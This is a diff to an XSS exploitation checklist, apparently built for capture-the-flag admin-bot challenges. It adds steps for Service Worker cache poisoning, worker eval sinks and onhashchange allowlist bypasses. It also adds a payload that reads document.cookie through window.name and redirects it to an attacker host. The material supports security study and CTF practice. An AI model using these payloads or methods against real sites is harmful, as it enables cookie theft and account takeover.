@@ -81,6 +81,32 @@ Rejected URL pattern:
 Useful error text:
 ```
 
+## 4b. Worker Eval + SW Cache Poison (when present)
+
+If the app uses a dedicated Worker and a Service Worker Cache API:
+
+- [ ] Find Worker sinks: `eval`, `Function`, `setTimeout(string)` on path/message data
+- [ ] Read `sw.js` for cache name and cache-first static scripts
+- [ ] Prove Cache API `put` from worker/page changes what `fetch('/static/...')` returns
+- [ ] Test whether **separate bot visits** share a browser profile (often they do not)
+- [ ] If external report URLs are allowed: iframe poison URL → wait → `location.replace(lab)` in one visit
+- [ ] Prefer sync main-thread exfil (`location.replace(oast+data)`) over async `fetch` against fast bot teardown
+
+See: `notes/worker-eval-sw-cache-poison.md`, `payloads/xss/worker-eval-sw-cache-poison-bot.md`
+
+## 4c. HTML Allowlist + Rare Event Handlers (when present)
+
+If profile/bio fields claim an allowlist or keep some raw tags:
+
+- [ ] Map per-field behavior (escape vs strip vs keep)
+- [ ] Enumerate kept tags (`<body>`, `<b>`, `<a>`, …)
+- [ ] Fuzz uncommon `on*` attrs — especially `onhashchange` if a hashchange stub exists
+- [ ] Do not stop at the visible `addEventListener('hashchange')` (often a red herring)
+- [ ] If handler needs a hash change: host an opener (`window.open` + set hash); framing may be blocked
+- [ ] Prefer external ticket URLs when the bot accepts them
+
+See: `notes/html-allowlist-body-onhashchange-xss.md`, `payloads/xss/body-onhashchange-allowlist-bot.md`
+
 ## 5. Build Same-Origin XSS URL
 
 Start with simple proof:
@@ -116,6 +142,14 @@ Preferred order:
 
 Use a disposable webhook/collaborator outside reusable notes.
 
+If filters block normal concat or URL-building syntax, test whether a tiny attacker page plus `window.name` can reduce the payload to:
+
+```text
+";name=document.cookie;location='//[attacker-host]'//
+```
+
+Then let the attacker page convert `window.name` into a server-side log request.
+
 Record:
 
 ```text
@@ -132,6 +166,9 @@ Determine whether failure is due to:
 - CSP blocking inline script
 - bot timeout
 - malformed report URL
+- `postMessage` validation using string coercion while the sink reuses a non-string object
+- `window.name` not surviving navigation in the real bot runtime
+- attacker host propagation/cache issues returning stale content or `404`
 
 If cookies are HttpOnly, pivot to in-browser fetch of admin-only routes.
 
@@ -169,5 +206,7 @@ Sensitive cookie was readable from JavaScript.
 - [ ] Same-origin XSS URL built.
 - [ ] Admin bot triggered successfully.
 - [ ] Sensitive data exfiltrated with minimal proof.
+- [ ] If using helper infrastructure, the attacker host was fresh and confirmed live before submission.
+- [ ] If the target uses `postMessage`, object/array overload confusion was tested in addition to plain-string origin spoofing.
 - [ ] Root cause and impact documented.
 - [ ] Reusable notes exclude live secrets, tokens, and flags.
